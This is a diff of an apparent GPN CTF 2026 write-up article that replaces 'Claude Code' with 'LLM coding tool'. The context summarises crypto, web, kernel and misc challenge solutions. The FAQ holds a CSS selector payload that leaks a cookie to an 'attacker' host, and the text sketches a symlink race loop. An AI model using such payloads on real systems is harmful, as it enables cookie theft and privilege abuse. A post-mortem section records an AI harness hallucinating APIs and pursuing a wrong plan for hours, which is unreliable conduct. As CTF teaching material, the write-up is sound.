@@ -59,7 +59,7 @@ keywords:
   - "fpylll bkz default strategies"
   - "kannan embedding lattice attack"
   - "ctf writeup llm harness post mortem"
-  - "claude code ctf workflow"
+  - "llm code ctf workflow"
 toc: true
 cover:
   image: "/images/articles/gpn-ctf-2026-writeup.png"
@@ -97,7 +97,7 @@ The two writeups worth flagging up front for jury readers: [`crypto/justfollowth
 | Misc     | knitted-flag                           | Knitout front-bed vs back-bed instruction encodes a 978×20 pixel bitmap — carrier colors are a decoy      |
 | Misc     | organized                              | 7.65 MB of "noise" carries ternary amplitude-modulated UART in per-12.5kB-window popcount density         |
 | Misc     | supercat                               | Setuid Rust `metadata()` then `read_to_string()` — TOCTOU symlink swap leaks `/flag`                      |
-| Meta     | LLM harness post-mortem                | Honest log of what Claude Code got right and (more importantly) wrong across the engagement               |
+| Meta     | LLM harness post-mortem                | Honest log of what LLM coding tool got right and (more importantly) wrong across the engagement               |
 
 19 challenge flags plus the meta writeup. Each link in the section headings below jumps to the standalone writeup in the GitHub repo, which carries the solver code and full byte-level traces.
 
@@ -342,7 +342,7 @@ Pydantic v2 treats string-shaped field annotations as `ForwardRef`s. When `model
 
 So submitting `{"x": "FLAG"}` produces a model where the schema-generation step evaluates `FLAG` and returns the value in the JSON description. Two lines of Python on the attacker side.
 
-The harness almost missed this one — Claude hallucinated `pydantic.create_model_from_typeddict` (doesn't exist in v2) and `get_type_hints(..., include_extras=True)` (not the path Pydantic v2's schema builder takes). Grep'ing the installed package source caught both. Less popular libraries: trust nothing without `grep`-confirmation.
+The harness almost missed this one — LLM hallucinated `pydantic.create_model_from_typeddict` (doesn't exist in v2) and `get_type_hints(..., include_extras=True)` (not the path Pydantic v2's schema builder takes). Grep'ing the installed package source caught both. Less popular libraries: trust nothing without `grep`-confirmation.
 
 **Flag class:** unsafe string evaluation inside schema generation; `eval` masquerading as type resolution.
 
@@ -428,7 +428,7 @@ A `.knitout` file — a standardised knitting-machine instruction format — dri
 
 The bit per instruction is *which bed*. Map `knit f` → 0 and `knit b` → 1 over 978 columns × 20 rows = 19,560 bits = a 978×20 pixel bitmap. Render it as a PNG.
 
-The PNG reads — by eye — `GPNCTF<...>`. The hard part is **font disambiguation**: are the angle quotes `<` and `>`, or are they `{` and `}`? Are the diamond glyphs `0` or `O`? Claude cannot do that — the harness output is a clean bitmap, the human's contribution is staring at a pixelated font and deciding which character it is.
+The PNG reads — by eye — `GPNCTF<...>`. The hard part is **font disambiguation**: are the angle quotes `<` and `>`, or are they `{` and `}`? Are the diamond glyphs `0` or `O`? LLM cannot do that — the harness output is a clean bitmap, the human's contribution is staring at a pixelated font and deciding which character it is.
 
 The flag is `{` and `0`, not `<` and `O`. Submission, flag, move on.
 
@@ -471,13 +471,13 @@ The race window is wide enough that a tight `while true; ln -sf …; done` loop 
 
 ## Meta — the LLM harness post-mortem
 
-The 19 writeups above were produced by **Claude Code (Opus 4.x, 1M-context build)** driving a small Bash/Python sandbox with parallel sub-agents, under a single human in the loop. The [`meta/llm-harness.md`](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/llm-harness.md) writeup is the honest post-mortem.
+The 19 writeups above were produced by **LLM coding tool (Opus 4.x, 1M-context build)** driving a small Bash/Python sandbox with parallel sub-agents, under a single human in the loop. The [`meta/llm-harness.md`](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/llm-harness.md) writeup is the honest post-mortem.
 
 The high-confidence takeaways from that post-mortem, distilled for security engineers building their own harnesses:
 
 - **Sub-agents are the unit of parallelism, not threads.** When `web/pharry` needed three independent PHP-7.4-behavior verifications, dispatching three sub-agents in one message returned three answers in parallel — two dead ends and one kill chain — instead of three serial round-trips of several minutes each.
 - **Cheap statistical recon is the harness's strongest play.** `misc/organized`'s entire ternary-UART recovery was three sub-agent runs: histogram, run-length, peak count. No human ran any analysis; the human picked the *next question*.
-- **The harness will refine a wrong plan forever.** The single biggest failure of the engagement was six hours on the MIHNP framing of `crypto/guess-the-taste` — Claude built **70+ unique Sage scripts**, five independent Xu-Hu-Sarkar lattice implementations, none of which recovered the secret because the challenge wasn't MIHNP. The corrective move ("step back; verify the handout matches the live service") has to come from outside the harness.
+- **The harness will refine a wrong plan forever.** The single biggest failure of the engagement was six hours on the MIHNP framing of `crypto/guess-the-taste` — LLM built **70+ unique Sage scripts**, five independent Xu-Hu-Sarkar lattice implementations, none of which recovered the secret because the challenge wasn't MIHNP. The corrective move ("step back; verify the handout matches the live service") has to come from outside the harness.
 - **Trust nothing in less-common ecosystems without grep-confirmation.** `web/restaurant-builder` produced two hallucinated Pydantic v2 APIs that don't exist. Grep'ing the installed package source caught both in two minutes.
 - **The final 1% of any vision task is human.** `misc/knitted-flag`'s `{` vs `<` and `0` vs `O` are pure carbon. The harness built the parser, picked the rotation, produced the PNG; the human read the font.
 
@@ -535,7 +535,7 @@ The server's "secure" ECDSA nonce is `sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, mes
 
 ### How was the LLM harness used across the engagement?
 
-Claude Code drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for `web/pharry`, three sub-agents verified PHP 7.4 PHAR behaviors in parallel; for `misc/organized`, three sub-agents ran the popcount histogram, run-length, and peak-count analyses without ever dumping raw output into the main context. The harness's biggest failure was six hours sunk on the MIHNP framing of `crypto/guess-the-taste` before a fresh look at the protocol output revealed the missing `mod q`. The corrective move — *kill plans early, verify the handout matches the live service* — has to come from outside the harness.
+LLM coding tool drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for `web/pharry`, three sub-agents verified PHP 7.4 PHAR behaviors in parallel; for `misc/organized`, three sub-agents ran the popcount histogram, run-length, and peak-count analyses without ever dumping raw output into the main context. The harness's biggest failure was six hours sunk on the MIHNP framing of `crypto/guess-the-taste` before a fresh look at the protocol output revealed the missing `mod q`. The corrective move — *kill plans early, verify the handout matches the live service* — has to come from outside the harness.
 
 ### What's the win condition on `reverse/koenigsberg-delivery-problem`?
 
@@ -581,7 +581,7 @@ For more CTF coverage — including [SAS CTF 2026 Quals' Incident 67 BGP hijack 
     {"@type": "Question","name": "What is the trick on the guess-the-taste NTRU challenge?","acceptedAnswer": {"@type": "Answer","text": "The implementation forgets to reduce the NTRU ciphertext modulo q. Standard NTRU encryption is c = (p · r · h + m) mod q; the bug drops the mod q. Without it, c reaches values up to ~p · q = 1536 instead of being bounded by q = 511. The algebra reduces to c mod p ≡ m, so plaintext = [c_i % 3 for c_i in c] recovers the message in two lines of Python."}},
     {"@type": "Question","name": "How does easy-dsa recover the ECDSA private key?","acceptedAnswer": {"@type": "Answer","text": "The server's secure ECDSA nonce is sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, message)). uuid3 is MD5 with a constant prefix. Marc Stevens' fastcoll generates two messages that MD5-collide under the namespace prefix, producing the same nonce k. Standard nonce-reuse equations recover k and d, with a sign-flip check against the public key to handle the symmetric solution."}},
     {"@type": "Question","name": "What is the gcc AVX2 lane swap in justfollowtherecipe?","acceptedAnswer": {"@type": "Answer","text": "gcc -O3 -funroll-loops -mavx2 vectorises a 4-wide inner-product loop with vpmuludq and a vpermd permute step that loads BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3] into AVX2 lanes 0..3. The store writes those lanes in order, so result[blk+1] and result[blk+2] are interchanged for every full block of 4. The scalar tail loop is untouched. For M = 64, swaps are (1,2), (5,6), …, (57,58); positions 60-63 are correct."}},
-    {"@type": "Question","name": "How was the LLM harness used across GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "Claude Code drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for web/pharry, three sub-agents verified PHP 7.4 PHAR behaviours in parallel. The biggest failure was six hours sunk on the MIHNP framing of guess-the-taste before a fresh look at the protocol output revealed the missing mod q. The corrective move — kill plans early, verify handout matches live service — must come from outside the harness."}},
+    {"@type": "Question","name": "How was the LLM harness used across GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "LLM coding tool drove a Bash/Python sandbox with parallel sub-agents for independent exploration. Sub-agents were the unit of parallelism — for web/pharry, three sub-agents verified PHP 7.4 PHAR behaviours in parallel. The biggest failure was six hours sunk on the MIHNP framing of guess-the-taste before a fresh look at the protocol output revealed the missing mod q. The corrective move — kill plans early, verify handout matches live service — must come from outside the harness."}},
     {"@type": "Question","name": "What is the win condition on the Königsberg Delivery Problem?","acceptedAnswer": {"@type": "Answer","text": "Hamiltonian path on a 250-node directed graph. The binary is a 4,500-line straight-line dispatch routine — 250 state blocks each ending in an indirect jmp rdx over a per-state jump table. The visit-counter is per-state, not per-edge, so the win condition is vertex coverage. Average out-degree ≈ 100/state, so Warnsdorff's heuristic on a 250-node digraph emits a path in ~70 ms with essentially zero backtracking."}},
     {"@type": "Question","name": "How does the CSS attribute-selector exfiltration work in tinyweb?","acceptedAnswer": {"@type": "Answer","text": "The site emits a Link: rel=preload header for an attacker-controlled URL; the parser admits comma-separated entries, so adding , rel=stylesheet injects a second link the browser fetches as a stylesheet. Attribute selectors like body[data-cookie^=\"a\"] { background: url(//attacker/?ch=a); } fire a network request when the attribute starts with the matched prefix. Iterate character-by-character to leak the cookie."}},
     {"@type": "Question","name": "Why is stupidcontract a kernel-forensics problem?","acceptedAnswer": {"@type": "Answer","text": "The handout is a 23 MB vmlinux built from a modified kernel that has had five string checks removed from the BPF verifier — specifically the BPF_ADJUST_END_FROM_* set that prevents signed-offset arithmetic into a map. Bzipped kernels differ in 99% of bytes due to section-layout shifts, so naive diff is uninformative. The forensics path is nm -D both kernels, diff the symbol tables, grep the verifier source for what the missing symbols used to enforce. With those checks gone, a negative-index OOB write on the eBPF map clobbers an adjacent kernel-heap object's function pointer."}},
